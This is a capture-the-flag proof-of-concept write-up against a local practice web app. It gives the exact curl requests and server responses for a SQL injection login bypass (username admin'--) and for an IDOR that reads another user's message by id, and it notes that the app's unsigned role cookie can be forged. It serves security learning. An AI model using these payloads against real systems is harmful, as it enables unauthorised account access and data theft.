# Proofs of concept

Each section records one captured flag, the literal request that produced it,
and the literal response that contains it. Requests are shown both as the exact
`curl` command that was run and as the bytes that went on the wire, so the
result can be reproduced without interpretation.

All testing was against `http://127.0.0.1:5000`, the local instance of the
practice target, started with `FLAG_SEED=s_hart`. Nothing outside this app was
touched.

A note on the em dash rule, since a reader grepping this file will find them.
Where an em dash appears inside a quoted response block it is the target's own
output, copied byte for byte. The app's templates render message titles as
`#<id> — <title>` (`messages.html:6`, `message_detail.html:5`), so any faithful
capture of those pages contains one. Those are evidence, and altering them would
make the record inaccurate, so they are preserved as received. No em dash
appears in the prose of this file.

Status: 2 of 6 captured (sqli, idor). The other four are not yet worked.

---

## 1. sqli: authentication bypass at `POST /login`

**Flag:** `FLAG{sqli_0883918f1b72}`
**Captured:** 2026-09-29
**Verified:** `verify.py` exit 1 with `1/6 valid` and the line
`FLAG{sqli_0883918f1b72}  VALID (sqli)`. Exit 1 is expected while five
challenges remain.

### The vulnerability

`login()` reads the two form fields and interpolates them straight into the SQL
text with `%` formatting (`app.py:210`, `app.py:211`, `app.py:213` to
`app.py:216`), then executes the finished string with no parameters
(`app.py:218`). Neither field is validated, escaped, or type-checked, so the
quote characters around them in the query are the only thing separating data
from SQL, and the attacker supplies those too.

The query is built as one single-line string, because the implicit concatenation
at `app.py:213` to `app.py:216` has no newline in it. That matters for the
payload: a `--` comment in SQLite runs to the end of the line, so in a
single-line query it discards everything after it.

### Step 1: the injected login

Literal request:

```
curl -s -i -c jar.txt -b jar.txt -X POST http://127.0.0.1:5000/login \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=x"
```

The bytes on the wire, from `curl --trace-ascii`:

```
username=admin%27--&password=x
```

The username decodes to `admin'--`. Literal response:

```
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.9 Python/3.13.15
Date: Tue, 29 Sep 2026 23:31:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Location: /dashboard
Set-Cookie: auth=YWRtaW46YWRtaW4=; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/dashboard">/dashboard</a>. If not, click the link.
```

The 302 to `/dashboard` is the login success path (`app.py:222`). The cookie is
the app's own `set_auth` output (`app.py:182` to `app.py:184`), and
`YWRtaW46YWRtaW4=` decodes to:

```
admin:admin
```

So the server believes the caller is `admin` with role `admin`, having never
seen a password.

### Step 2: reading the flag

The flag is not in the login response. It is admin's `secret_note`
(`app.py:136` to `app.py:137`), which `/dashboard` reads back by the username
taken from the cookie (`app.py:234` to `app.py:238`).

Literal request:

```
curl -s -b jar.txt http://127.0.0.1:5000/dashboard
```

Literal response, trimmed to the body region, unmodified otherwise:

```
  <header>
    <a href="/" class="brand">Vuln Hub</a>
    <nav>
      <a href="/">Home</a>
      <a href="/login">Login</a>
      <a href="/messages">Messages</a>
      <a href="/guestbook">Guestbook</a>
      <a href="/download?file=welcome.txt">Downloads</a>
      <a href="/logout">Logout (admin)</a>
    </nav>
  </header>

  <main>

<h1>Dashboard</h1>
<p>Signed in as <strong>admin</strong> (role: admin).</p>
<div class="note">
  <h2>Your private note</h2>
  <p>Nice work bypassing the login. FLAG{sqli_0883918f1b72}</p>
</div>

  </main>
```

The nav bar renders `Logout (admin)` and the page reports `role: admin`, both
drawn from the cookie the injection produced. The flag appears in the
`secret_note` div, which is `dashboard.html:7`.

### Why the payload works

The handler builds this string, with the two fields substituted at
`app.py:213` to `app.py:216`:

```sql
SELECT id, username, role FROM users WHERE username = 'admin'--' AND password = 'x'
```

Everything from `--` to the end of the line is an SQL comment, so the database
parses this instead:

```sql
SELECT id, username, role FROM users WHERE username = 'admin'
```

Three things follow from that, and each is required for the exploit:

1. The password condition is gone, so no password is needed.
2. The closing quote that the app appended is inside the comment, so the
   deliberately unbalanced quote in `admin'--` never breaks the syntax.
3. The statement still selects `id`, `username` and `role`, which matters
   because `app.py:223` reads `row["username"]` and `row["role"]` by name to
   build the cookie. A payload that returned different columns would fail here
   even if it authenticated.

The handler then only tests truthiness, `if row` (`app.py:221`), so any non-empty
result set is accepted, and `row` is the admin row because the `WHERE` clause
still names `admin`.

### Controls run alongside the exploit

Three requests were sent to separate "the injection worked" from "the login
worked":

| Request | Result | What it rules out |
|---|---|---|
| `username=admin`, `password=wrong` | `200`, body contains `Invalid credentials.` | admin's real password was not guessed, and the endpoint does reject bad credentials |
| `username=alice`, `password=password123` | `302` to `/dashboard` | the normal login path works, so the injected `302` is the same success path and not an error |
| `username=admin'--`, `password=x` | `302` with `auth=YWRtaW46YWRtaW4=` | the outcome is caused by the injection, since `x` is not a valid password |

The second control is the important one: it shows the app was healthy and the
legitimate login flow was intact at the time of the test, so the bypass is not
an artifact of a broken target.

### Reproduction notes

- The admin password is regenerated on every process start (`app.py:75`), so
  there is no fixed credential to test against. That is also why the control
  above used a guess rather than the real password: the real one is random and
  unknown. The bypass does not depend on it.
- The cookie is only valid for the life of the process, and it is not signed, so
  it can also be pasted directly into a request as
  `Cookie: auth=YWRtaW46YWRtaW4=` instead of being obtained by the injection.
  The PoC keeps the login step because it is the step that demonstrates the
  vulnerability.
- Restarting the app rebuilds the database (`app.py:407`, `app.py:105` to
  `app.py:107`) and clears the cookie jar's usefulness, but not the flag, which
  is derived from `FLAG_SEED` (`app.py:62` to `app.py:67`) and is therefore
  stable across restarts for a given seed.
- The value of `FLAG_SEED` used was `s_hart`, and the flag was accepted by
  `verify.py` for `--username s_hart`, so the capture is valid for this account.

### Result

Appended to `submission.txt`:

```
FLAG{sqli_0883918f1b72}
```

Verifier output:

```
verify: 1/6 valid. Still missing: idor, xss, authz, traversal, exposure
FLAG{sqli_0883918f1b72}  VALID (sqli)

1/6 flags valid for username s_hart
```

No entry was made in `attempts.md`, because the challenge was captured on the
first attempt and the stopping rule applies only after three failures.

---

## 2. idor: missing ownership check at `GET /messages/<int:msg_id>`

**Flag:** `FLAG{idor_c143bbc0c939}`
**Captured:** 2026-09-29
**Verified:** `verify.py` exit 1 with `2/6 valid` and the line
`FLAG{idor_c143bbc0c939}  VALID (idor)`. Exit 1 is expected while four
challenges remain.

### The vulnerability

`message_detail()` looks the message up by id and nothing else
(`app.py:265` to `app.py:267`). It fetches the `owner` column, so the information
needed for an ownership check is right there in the row, but the function never
compares it against the caller. The only two tests in the handler are whether a
user is logged in (`app.py:261`) and whether a row came back (`app.py:268`).

The list route at `app.py:253` to `app.py:255` does the opposite: it filters
`WHERE owner = ?` with the caller's username. So the app knows how to scope
messages to their owner, and applies that scoping on one route while omitting it
on the other. The list page then hands the user the ids they are allowed to see
(`messages.html:6`), which is what makes the id trivial to guess and increment.

This is the IDOR precisely stated: the object identifier is user-supplied and
the authorization decision that should accompany it is absent. It is not a
missing authentication bug, and the controls below demonstrate that difference.

### Step 1: establish a genuine session

The session used is a normal login with the handout credentials, not a forged
cookie. Literal request:

```
curl -s -i -c alice.txt -X POST http://127.0.0.1:5000/login \
  --data-urlencode "username=alice" \
  --data-urlencode "password=password123"
```

Response headers:

```
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: auth=YWxpY2U6dXNlcg==; Path=/
```

`YWxpY2U6dXNlcg==` decodes to `alice:user`. The cookie was issued by the app
itself through its own `set_auth` (`app.py:182` to `app.py:184`) in response to
real credentials, so nothing about the following requests depends on forging or
tampering with it.

### Step 2: the list shows only alice's messages

Literal request:

```
curl -s -b alice.txt http://127.0.0.1:5000/messages
```

Literal response, body region:

```
<h1>Your messages</h1>
<ul>

    <li><a href="/messages/4">#4 — Grocery list</a></li>

    <li><a href="/messages/5">#5 — Vacation</a></li>

</ul>
```

Ids 4 and 5 are the two rows seeded with `owner = 'alice'` (`app.py:151` to
`app.py:152`). Id 1 does not appear, which establishes that the app considers it
not alice's.

### Step 3: alice's own message, the authorized case

Literal request:

```
curl -s -o m5.html -w "http_code=%{http_code}\n" -b alice.txt \
  http://127.0.0.1:5000/messages/5
```

Literal response, `http_code=200`:

```
  <h1>#5 — Vacation</h1>
  <p class="meta">To: alice</p>
  <p>Out of office next Monday.</p>
```

### Step 4: admin's message, the same request shape with a different id

Literal request, identical except for the id:

```
curl -s -o m1.html -w "http_code=%{http_code}\n" -b alice.txt \
  http://127.0.0.1:5000/messages/1
```

Literal response, `http_code=200`:

```
  <h1>#1 — Onboarding secret</h1>
  <p class="meta">To: admin</p>
  <p>Internal only. Do not share. FLAG{idor_c143bbc0c939}</p>
```

This is the evidence. The `To: admin` line is rendered from `row.owner`
(`message_detail.html:6`), so the page itself states that the record belongs to
admin while it is being served to a session the app knows is alice.

### The contrast, side by side

| Request | Session | HTTP | Record served | Rendered owner |
|---|---|---|---|---|
| `GET /messages` | alice | 200 | ids 4 and 5 only | alice |
| `GET /messages/5` | alice | 200 | id 5 | `To: alice` |
| `GET /messages/1` | alice | 200 | id 1 | `To: admin` |

The first row and the third row are the contradiction. The list route refuses to
show id 1 to alice, and the detail route serves it to her on request.

### Controls run alongside the exploit

| Request | Result | What it rules out |
|---|---|---|
| `GET /messages/99` as alice | `404` | the route does distinguish a missing record, so the `200` on id 1 means the record exists and was deliberately served, not that the route returns `200` for anything |
| `GET /messages/1` with no cookie | `302` to `/login` | the route is not unauthenticated; a session is genuinely required, so the defect is the missing ownership check specifically, not the absence of any access control |

The second control is the one that separates this from an authn bug. With a
valid alice session the request succeeds; with no session it is redirected. The
session is doing its job. What is missing is the second question, "is this row
alice's", which `app.py:265` to `app.py:270` never asks.

### Why the id is guessable

The seeded ids are contiguous and start at 1 (`app.py:144` to `app.py:154`), and
the list route prints each owned id into the link href (`messages.html:6`), so
alice sees `#4` and `#5` and can simply walk downwards. The `<int:msg_id>`
converter (`app.py:259`) accepts any non-negative integer, so the endpoint
serves the whole id space.

### Reproduction notes

- The flag is in `messages.body` for id 1, owned by admin (`app.py:148` to
  `app.py:149`), described in the source as the IDOR reward.
- The SQL here is parameterized (`app.py:265` to `app.py:267`), so this is not an
  injection. The id is bound as a value, which is why the fix is an
  authorization check and not an escaping change. Worth stating plainly in the
  report, because the two bugs sit on adjacent lines and look similar.
- Restarting the app rebuilds the database and restores the seeded rows
  (`app.py:407`, `app.py:105` to `app.py:107`); the flag is stable across
  restarts because it derives from `FLAG_SEED` (`app.py:62` to `app.py:67`).

### Result

Appended to `submission.txt`:

```
FLAG{idor_c143bbc0c939}
```

Verifier output:

```
verify: 2/6 valid. Still missing: xss, authz, traversal, exposure
FLAG{sqli_0883918f1b72}  VALID (sqli)
FLAG{idor_c143bbc0c939}  VALID (idor)

2/6 flags valid for username s_hart
```

No entry was made in `attempts.md`: the challenge was captured on the first
attempt.
